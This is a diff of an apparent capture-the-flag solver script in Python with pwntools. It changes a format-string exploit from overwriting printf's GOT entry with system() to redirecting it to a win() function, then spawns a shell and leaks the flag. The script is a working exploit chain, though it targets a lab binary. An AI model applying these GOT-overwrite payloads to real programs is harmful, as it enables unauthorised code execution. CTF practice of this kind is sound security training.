@@ -1,19 +1,14 @@
 #!/usr/bin/env python3
 """
-fmt-got — solver
+easy-fmt-got — solver
 ================
 
 Exploitation chain
 ------------------
-1. Receive the system() address leaked by the binary on startup.
-2. Compute the printf GOT address (fixed; binary has no PIE).
-3. Use pwntools' fmtstr_payload to craft a format-string payload that
-   overwrites the printf GOT entry with the leaked system() address.
-4. Send the payload → printf(payload) performs the GOT write and returns.
-5. On the next loop iteration, send "/bin/sh\\0" → printf("/bin/sh") now
-   calls system("/bin/sh") → interactive shell.
-6. From the shell, run `./flag` to print the flag (the flag binary is SUID
-   root and can read /flag.txt even though the ctf user cannot).
+1. Compute printf@GOT and win() address from the no-PIE binary.
+2. Craft format-string payload to overwrite printf@GOT -> win.
+3. Send payload, then send a trigger line so program calls win().
+4. In spawned shell, run ./flag and send %1$s to leak the embedded flag.
 
 Usage
 -----
@@ -29,10 +24,7 @@ python3 solve.py LOCAL DEBUG
 
 from pwn import *
 
-# ── load the binary so pwntools can resolve GOT addresses ────────────────────
-# Use the binary extracted from the Docker image (see README.md).
-# If you have used patchelf to link against the container's libc, point this
-# at "chall_patched" instead.
+# ── load the binary so pwntools can resolve symbols/GOT addresses ────────────
 exe = ELF("./chall", checksec=False)
 context.binary = exe
 context.log_level = "info"
@@ -51,59 +43,44 @@ def conn() -> tube:
     return remote("localhost", 3012)   # ← change host/port for the real event
 
 
-# ── format-string offset discovery (run once offline) ────────────────────────
-def find_offset() -> int:
-    """Brute-force the format-string offset using pwntools' FmtStr helper."""
-    def exec_fmt(payload: bytes) -> bytes:
-        p = process([exe.path])
-        p.recvline()          # discard the system() leak line
-        p.sendline(payload)
-        return p.recvall()
-
-    autofmt = FmtStr(exec_fmt)
-    return autofmt.offset
-
-
 # ── main exploit ──────────────────────────────────────────────────────────────
 def main() -> None:
     r = conn()
 
-    # ── step 1: receive the system() address leak ─────────────────────────────
-    line = r.recvline()
-    # expected format: b"Gift for you: 0x7f...\n"
-    system_addr = int(line.split(b": ")[1].strip(), 16)
-    log.success(f"system()  @ {hex(system_addr)}")
+    # banner/hint lines
+    r.recvline(timeout=1)
+    r.recvline(timeout=1)
+    r.recvline(timeout=1)
 
-    # ── step 2: resolve printf GOT entry (static; no PIE) ────────────────────
+    # ── step 1: resolve addresses from local ELF (no PIE) ─────────────────────
     printf_got = exe.got["printf"]
+    win_addr = exe.symbols["win"]
     log.info(f"printf GOT @ {hex(printf_got)}")
+    log.info(f"win()      @ {hex(win_addr)}")
 
-    # ── step 3: craft the format-string payload ───────────────────────────────
+    # ── step 2: craft format-string payload ───────────────────────────────────
     # offset = 6: the buffer is the 6th argument seen by printf on x86-64
-    # (rdi = fmt ptr, positions 1-5 are rsi/rdx/rcx/r8/r9 + first stack slot,
-    # position 6 is where buf itself lands on the stack).
-    #
     # write_size='short' uses %hn (2-byte) writes, keeping the payload shorter.
     offset = 6
-    writes = {printf_got: system_addr}
+    writes = {printf_got: win_addr}
     payload = fmtstr_payload(offset, writes, write_size="short")
     log.info(f"payload ({len(payload)} bytes): {payload[:32]}...")
 
-    # ── step 4: send payload → GOT overwrite happens inside printf(buf) ───────
+    # ── step 3: send payload and trigger hijacked printf call ─────────────────
     r.sendline(payload)
-    # Drain the garbage output produced by the format-string directives.
-    # A generous timeout is fine here; we just want to clear the pipe.
     r.recvuntil(b"\n", timeout=3)
+    r.sendline(b"trigger")
 
-    # ── step 5: trigger system("/bin/sh") ────────────────────────────────────
-    # printf is now system; sending "/bin/sh\0" calls system("/bin/sh\0").
-    log.success("Triggering system('/bin/sh') …")
-    r.sendline(b"/bin/sh")
+    # ── step 4: use shell to leak flag from execute-only helper ───────────────
+    log.success("Shell should be up. Leaking flag via ./flag + %1$s")
+    r.sendline(b"./flag")
+    r.sendline(b"%1$s")
 
-    # ── step 6: drop into interactive mode ───────────────────────────────────
-    # The shell is now running.  The flag binary (/challenge/flag) is SUID root
-    # and will print the contents of /flag.txt.
-    log.success("Shell spawned.  Run:  ./flag")
+    leaked = r.recvline(timeout=2)
+    if leaked:
+        log.success(f"flag line: {leaked.strip().decode(errors='replace')}")
+
+    # keep shell for manual interaction
     r.interactive()
 
 
